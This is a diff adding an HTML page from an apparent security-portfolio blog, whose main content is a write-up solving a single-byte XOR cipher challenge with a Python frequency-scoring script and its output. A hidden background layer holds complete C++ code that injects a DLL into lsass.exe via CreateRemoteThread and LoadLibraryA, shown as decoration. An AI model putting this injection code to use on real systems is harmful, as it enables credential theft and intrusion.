@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>--------------------------------------------------</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="--------------------------------------------------" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>--------------------------------------------------</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p>The hex encoded string:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736
+</code></pre></div></div>
+<p>… has been XOR’d against a single character. Find the key, decrypt the message.</p>
+
+<p>You can do this by hand. But don’t: write code to do it for you.</p>
+
+<p>How? Devise some method for “scoring” a piece of English plaintext. Character frequency is a good metric. Evaluate each output and choose the one with the best score.</p>
+
+<p>Achievement Unlocked
+You now have our permission to make “ETAOIN SHRDLU” jokes on Twitter.</p>
+
+<p>code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">collections</span> <span class="kn">import</span> <span class="n">Counter</span>
+<span class="kn">from</span> <span class="n">string</span> <span class="kn">import</span> <span class="n">ascii_lowercase</span>
+<span class="kn">import</span> <span class="n">math</span>
+
+<span class="c1"># --------------------------------------------------
+# Build English frequency model from corpus
+# --------------------------------------------------
+</span>
+<span class="k">def</span> <span class="nf">get_freq</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">letters</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+    <span class="n">counts</span> <span class="o">=</span> <span class="nc">Counter</span><span class="p">()</span>
+    <span class="n">text</span> <span class="o">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
+        <span class="n">counts</span><span class="p">[</span><span class="n">letter</span><span class="p">]</span> <span class="o">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">count</span><span class="p">(</span><span class="n">letter</span><span class="p">)</span>
+
+    <span class="n">total</span> <span class="o">=</span> <span class="nf">sum</span><span class="p">(</span><span class="n">counts</span><span class="p">.</span><span class="nf">values</span><span class="p">())</span>
+    <span class="k">return</span> <span class="p">{</span><span class="n">letter</span><span class="p">:</span> <span class="n">counts</span><span class="p">[</span><span class="n">letter</span><span class="p">]</span> <span class="o">/</span> <span class="n">total</span> <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">}</span>
+
+
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">pg84.txt</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">corpus</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+
+<span class="n">freq</span> <span class="o">=</span> <span class="nf">get_freq</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span> <span class="n">ascii_lowercase</span><span class="p">)</span>
+
+<span class="c1"># --------------------------------------------------
+# XOR helper
+# --------------------------------------------------
+</span>
+<span class="k">def</span> <span class="nf">xor_bytes_const</span><span class="p">(</span><span class="n">b</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">const</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+    <span class="k">return</span> <span class="nf">bytes</span><span class="p">([</span><span class="n">const</span> <span class="o">^</span> <span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">b</span><span class="p">])</span>
+
+<span class="c1"># --------------------------------------------------
+# Bhattacharyya distance
+# --------------------------------------------------
+</span>
+<span class="k">def</span> <span class="nf">bhattacharyya_distance</span><span class="p">(</span><span class="n">dist1</span><span class="p">:</span> <span class="nb">dict</span><span class="p">,</span> <span class="n">dist2</span><span class="p">:</span> <span class="nb">dict</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">float</span><span class="p">:</span>
+    <span class="n">bc</span> <span class="o">=</span> <span class="mf">0.0</span>
+    <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">dist1</span><span class="p">:</span>
+        <span class="n">bc</span> <span class="o">+=</span> <span class="n">math</span><span class="p">.</span><span class="nf">sqrt</span><span class="p">(</span><span class="n">dist1</span><span class="p">[</span><span class="n">letter</span><span class="p">]</span> <span class="o">*</span> <span class="n">dist2</span><span class="p">[</span><span class="n">letter</span><span class="p">])</span>
+    <span class="k">return</span> <span class="o">-</span><span class="n">math</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="n">bc</span><span class="p">)</span>
+
+<span class="c1"># --------------------------------------------------
+# Scoring function
+# --------------------------------------------------
+</span>
+<span class="k">def</span> <span class="nf">scoring_fun</span><span class="p">(</span><span class="n">word</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">float</span><span class="p">:</span>
+    <span class="n">curr_freq</span> <span class="o">=</span> <span class="p">{</span><span class="n">letter</span><span class="p">:</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">freq</span><span class="p">}</span>
+    <span class="n">num_letters</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">word</span><span class="p">:</span>
+        <span class="n">ch</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">b</span><span class="p">).</span><span class="nf">lower</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">curr_freq</span><span class="p">:</span>
+            <span class="n">curr_freq</span><span class="p">[</span><span class="n">ch</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">num_letters</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">if</span> <span class="n">num_letters</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">0</span>
+
+    <span class="n">curr_freq</span> <span class="o">=</span> <span class="p">{</span><span class="n">k</span><span class="p">:</span> <span class="n">v</span> <span class="o">/</span> <span class="n">num_letters</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">curr_freq</span><span class="p">.</span><span class="nf">items</span><span class="p">()}</span>
+    <span class="n">distance</span> <span class="o">=</span> <span class="nf">bhattacharyya_distance</span><span class="p">(</span><span class="n">freq</span><span class="p">,</span> <span class="n">curr_freq</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="mi">1</span> <span class="o">/</span> <span class="n">distance</span>
+
+<span class="c1"># --------------------------------------------------
+# Crack single-byte XOR
+# --------------------------------------------------
+</span>
+<span class="n">src</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span>
+    <span class="sh">"</span><span class="s">1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736</span><span class="sh">"</span>
+<span class="p">)</span>
+
+<span class="n">best_score</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">best_plaintext</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
+<span class="n">best_key</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+    <span class="n">candidate</span> <span class="o">=</span> <span class="nf">xor_bytes_const</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    <span class="n">score</span> <span class="o">=</span> <span class="nf">scoring_fun</span><span class="p">(</span><span class="n">candidate</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">score</span> <span class="o">&gt;</span> <span class="n">best_score</span><span class="p">:</span>
+        <span class="n">best_score</span> <span class="o">=</span> <span class="n">score</span>
+        <span class="n">best_plaintext</span> <span class="o">=</span> <span class="n">candidate</span>
+        <span class="n">best_key</span> <span class="o">=</span> <span class="n">key</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">best_plaintext</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">key =</span><span class="sh">"</span><span class="p">,</span> <span class="n">best_key</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">score =</span><span class="sh">"</span><span class="p">,</span> <span class="n">best_score</span><span class="p">)</span>
+</code></pre></div></div>
+<p>output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cooking MC<span class="s1">'s like a pound of bacon
+key = 88
+score = 4.329118885751811
+</span></code></pre></div></div>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
